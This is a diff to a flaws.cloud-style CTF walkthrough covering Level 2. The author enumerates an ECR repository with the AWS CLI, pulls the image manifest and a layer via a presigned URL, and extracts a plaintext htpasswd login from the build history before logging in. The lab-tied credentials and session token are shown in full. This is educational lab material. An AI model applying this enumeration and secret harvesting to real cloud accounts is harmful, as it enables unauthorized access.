@@ -204,6 +204,141 @@ The next level: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
 ### Level 2
 Visit: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
 
+```
+┌─[✗]─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws sts get-caller-identity --profile level1
+{
+    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2a2b5094-a1d9-4202-9fc9-01ce9c0af885)
+
+
+```
+┌─[✗]─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws ecr list-images --repository-name level2 --registry-id 653711331788 --profile level1 --region us-east-1
+{
+    "imageIds": [
+        {
+            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
+            "imageTag": "latest"
+        }
+    ]
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9781fa8f-ebce-4bf4-852c-a3a48fd2755f)
+
+
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest --profile level1 --region us-east-1 | jq '.images[].imageManifest | fromjson'
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+  "config": {
+    "mediaType": "application/vnd.docker.container.image.v1+json",
+    "size": 5359,
+    "digest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 43412182,
+      "digest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 848,
+      "digest": "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 619,
+      "digest": "sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 168,
+      "digest": "sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 32516034,
+      "digest": "sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 217,
+      "digest": "sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 619,
+      "digest": "sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 893,
+      "digest": "sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 508,
+      "digest": "sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 213,
+      "digest": "sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935"
+    }
+  ]
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2d02d846-c388-4138-ad26-aa17e53d43b8)
+
+
+```
+┌─[✗]─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621" --profile level1 --region us-east-1
+{
+    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLWVhc3QtMSJGMEQCIFlpqmuJzybSDTbSxYZ6XqOgAnjcef%2BSg2V2nh3vhFobAiBY7DaCTixZSqzk9B1fP373gklZrp%2B3pyOZ7xDRF2%2FAzyrMAwjG%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAUaDDU5MTEwNTkxNDk1MiIMYD9sGjrJ8CE8Z4%2ByKqAD0OWCXgQkG%2BOfNxdTCdIKOLsSfHSDZeWib0X4V3gOIEI7AtdSmZ56%2FL27Q7JJDx4nDTamt115Y73f0LoldZ18FCudy8gAOazlr%2BNHEC4%2BWaMIGP3W94%2FiZKY37yQKoPWzmJD65chxB2IghE1IkapzF%2FtgwL%2FvjXoT8a7X7l8p25dsnguUx9ohVOdhehLj%2FxPDYxZ9sIXUk57QD0YUG6oaSxA0IU7PQHunpu6qF4PPn1VkFw9xaN7Us1KloXTEQWREzwyC46q0h9%2Bq7ci0F9N5THOjozX5glwj89BngzlR%2F6QiSHIyqaleNQYeXlHeVG3dHMdttZbkEYJC%2FvocT5K2YMn%2F5zAsNGg6N6K7d8gFPVplWR9%2BJEqqSQTbPMx4MRIkll%2FbKWdnCdyHamJShvHy6ynq0vMjOiHMgwbMpGRo5N4fyEwAOh%2BfL8oAZ052mAKXn5xQNMmyNdXxa0MsM3VubJfmZQ0sNFX2JjkzRbZnwqdDJxz1LZfvQL%2FolF8TX1k9iXSsUTBaaufzBwJh061RNTCEREg8ftTJqAnoec35pfIwtpODswY6ogGOA%2BnDhTTv9RoI6jbJBntMCjN9vx6v7ECW3ac3BD%2BYF4hdIKv7J0tQ7GCPqhYNdYCDfa0BUzZ6TXuPh4k0ZHYEY3PhPCsUUIw94L5Q2FVuhvLzyKoMlMZEBmgeINk6pAXpzwNzcEO4W0vum0qoAcSuckH6d%2FpSikwg7M8dUzIi%2FrCf%2BtX1JykTia6LSmCDlUa75SY3rGT5%2Bk1SjR%2BHgYVyLJI%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240605T210550Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3599&X-Amz-Credential=ASIAYTIFIPBEIMLUGEOM%2F20240605%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=c056fe26339e82539bfbe728412fef914dc596683c80b9325fc9495674e4abb7",
+    "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e4f09c1b-3f0e-4772-b3d5-9fa16ba470eb)
+
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $cat 1e964f10-a061-4e7b-9290-4447e821fe9a | grep "/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"
+{"architecture":"amd64","config":{"Hostname":"","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["sh","/var/www/html/start.sh"],"ArgsEscaped":true,"Image":"sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":null},"container":"ac1212c533fd9920b36cf3518caeb27b07e5efca6d40a0cfb07acc94c3f02055","container_config":{"Hostname":"ac1212c533fd","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sh","-c","#(nop) ","CMD [\"sh\" \"/var/www/html/start.sh\"]"],"ArgsEscaped":true,"Image":"sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{}},"created":"2018-11-27T03:32:59.959842964Z","docker_version":"18.09.0","history":[{"created":"2018-11-19T21:23:51.037171729Z","created_by":"/bin/sh -c #(nop) ADD file:efec03b785a78c01a6ade862d9a309f500ffa9f5f9314be26621f7fda0d5dfb8 in / "},{"created":"2018-11-19T21:23:51.855666335Z","created_by":"/bin/sh -c set -xe \t\t\u0026\u0026 echo '#!/bin/sh' \u003e /usr/sbin/policy-rc.d \t\u0026\u0026 echo 'exit 101' \u003e\u003e /usr/sbin/policy-rc.d \t\u0026\u0026 chmod +x /usr/sbin/policy-rc.d \t\t\u0026\u0026 dpkg-divert --local --rename --add /sbin/initctl \t\u0026\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \t\u0026\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \t\t\u0026\u0026 echo 'force-unsafe-io' \u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t\u0026\u0026 echo 'DPkg::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' \u003e /etc/apt/apt.conf.d/docker-clean \t\u0026\u0026 echo 'APT::Update::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' \u003e\u003e /etc/apt/apt.conf.d/docker-clean \t\u0026\u0026 echo 'Dir::Cache::pkgcache \"\"; Dir::Cache::srcpkgcache \"\";' \u003e\u003e /etc/apt/apt.conf.d/docker-clean \t\t\u0026\u0026 echo 'Acquire::Languages \"none\";' \u003e /etc/apt/apt.conf.d/docker-no-languages \t\t\u0026\u0026 echo 'Acquire::GzipIndexes \"true\"; Acquire::CompressionTypes::Order:: \"gz\";' \u003e /etc/apt/apt.conf.d/docker-gzip-indexes \t\t\u0026\u0026 echo 'Apt::AutoRemove::SuggestsImportant \"false\";' \u003e /etc/apt/apt.conf.d/docker-autoremove-suggests"},{"created":"2018-11-19T21:23:52.559321408Z","created_by":"/bin/sh -c rm -rf /var/lib/apt/lists/*"},{"created":"2018-11-19T21:23:53.235657088Z","created_by":"/bin/sh -c mkdir -p /run/systemd \u0026\u0026 echo 'docker' \u003e /run/systemd/container"},{"created":"2018-11-19T21:23:53.455319926Z","created_by":"/bin/sh -c #(nop)  CMD [\"/bin/bash\"]","empty_layer":true},{"created":"2018-11-27T03:32:57.013663339Z","created_by":"/bin/sh -c apt-get update     \u0026\u0026 apt-get install -y nginx apache2-utils python    \u0026\u0026 apt-get clean     \u0026\u0026 rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*     \u0026\u0026 echo \"daemon off;\" \u003e\u003e /etc/nginx/nginx.conf"},{"created":"2018-11-27T03:32:58.202361504Z","created_by":"/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"},{"created":"2018-11-27T03:32:58.481042948Z","created_by":"/bin/sh -c #(nop) ADD file:b311a5fa51887368e53012f2f31aafc46e999e44c238c9e2b23f47019f846acd in /etc/nginx/sites-available/default "},{"created":"2018-11-27T03:32:58.803695628Z","created_by":"/bin/sh -c #(nop) ADD file:fd3724e587d17e4bc8690d9febe596b4141f9e217111be51d530c5b55dfde646 in /var/www/html/index.htm "},{"created":"2018-11-27T03:32:59.112401386Z","created_by":"/bin/sh -c #(nop) ADD file:f8fd45be7a30bffa5ade2f6a47934c19f4fe1a1343e7229e7e730029f1730801 in /var/www/html/proxy.py "},{"created":"2018-11-27T03:32:59.411617545Z","created_by":"/bin/sh -c #(nop) ADD file:d29d68489f34ad71849687ac2eb66ceaee28315017d779fcfd5858423afee402 in /var/www/html/start.sh "},{"created":"2018-11-27T03:32:59.6820302Z","created_by":"/bin/sh -c #(nop)  EXPOSE 80","empty_layer":true},{"created":"2018-11-27T03:32:59.959842964Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\" \"/var/www/html/start.sh\"]","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:41c002c8a6fd36397892dc6dc36813aaa1be3298be4de93e4fe1f40b9c358d99","sha256:647265b9d8bc572a858ab25a300c07c0567c9124390fd91935430bf947ee5c2a","sha256:819a824caf709f224c414a56a2fa0240ea15797ee180e73abe4ad63d3806cae5","sha256:3db5746c911ad8c3398a6b72aa30580b25b6edb130a148beed4d405d9c345a29","sha256:1c1ac3ae43d53b452e0dfb320a5c22cf8ff5e8068a7ecef6779600d14ad4751b","sha256:bc16ef0350ee1577dfe09696bff225b40d241b26a359c146ffd5746a8ce18931","sha256:5db51ba604f0593199b4d8705a21fe6b1bc6cee503f7468539f6a80aa3cc4750","sha256:4e7b9bca030ac43814d0a6c6afed36f70fc2bb01a9dd84705358f424af1dae1e","sha256:5494da4989bbd817e20ead7cbaa8985d9907db95ea07b3e212e2e483de767f1d","sha256:67df634e1db11f3a6533ed051811c8290b69d7104550617dcc79303304cc78bb"]}}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/910551d0-9b75-4e9b-88f3-134c58aa859b)
+
+Download
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/6eef6630-798a-4444-a725-bbf9593428f5)
+
+Login http://container.target.flaws2.cloud/ with **laws2**:**secret_password** credentials:
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/95582788-0fa7-4576-949e-58eb252f9fd6)
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/40ee174f-4bb0-4560-a936-465ccf8d8540)
+
+
+### Level 3
+Visit: http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/
+
+
+
+
+
 
 
 
